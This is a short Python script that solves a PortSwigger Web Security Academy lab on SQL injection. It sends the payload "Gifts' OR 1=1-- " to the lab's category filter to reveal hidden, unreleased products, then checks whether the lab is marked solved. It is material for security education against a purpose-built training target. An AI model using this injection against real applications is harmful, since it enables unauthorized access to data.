#!/usr/bin/env python3
"""
SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
PortSwigger Web Security Academy -- SQL Injection

Companion script for the writeup: 01-retrieve-hidden-data.md

What this does:
    Sends a single crafted request to the product category filter that closes the
    quoted string and appends an always-true OR condition, commenting out the rest
    of the query. This bypasses the hidden "released = 1" filter and returns every
    product in the category, including unreleased ones.

Usage:
    python 01-retrieve-hidden-data.py <lab-url>
    e.g. python 01-retrieve-hidden-data.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import sys
import httpx


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    r = client.get(f"{lab_url}/filter", params={"category": "Gifts' OR 1=1-- "})
    print(f"[*] Response status: {r.status_code}, length: {len(r.text)} bytes")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- hidden/unreleased products are now visible.")
    else:
        print("[-] Not solved yet -- inspect the response body for unreleased products.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
